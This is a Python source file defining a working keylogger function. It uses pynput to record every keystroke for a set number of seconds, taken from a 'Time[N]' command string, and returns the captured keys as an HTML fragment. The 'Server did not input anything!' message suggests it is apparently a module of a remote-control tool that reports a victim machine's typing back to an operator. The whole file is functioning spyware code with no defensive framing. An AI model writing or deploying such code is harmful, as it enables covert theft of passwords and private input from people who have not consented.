import logging
import os
import re
import time
import threading
from pynput.keyboard import Listener


def key_logger(timeRec):
    global listener
    global key_string

    timeLog = int(re.search(r"Time\[(\d+)\]", timeRec).group(1))
    key_string = ""

    def on_press(key):
        global key_string
        try:
            key_string += str(key) + " "
            logging.info(key)
        except AttributeError:
            key_string += str(key)
            logging.error(key)

    with Listener(on_press=on_press) as listener:
        listener_thread = threading.Thread(target=listener.join)
        listener_thread.start()
        # listen for ten seconds
        time.sleep(timeLog)
        listener.stop()

    if key_string != "":
        return "<div class='mb-2'><b>Key logger:</b> " + key_string + "</div>"
    else:
        return "<div class='mb-2'><b>Key logger:</b> " + key_string + "Server did not input anything!" + "</div>"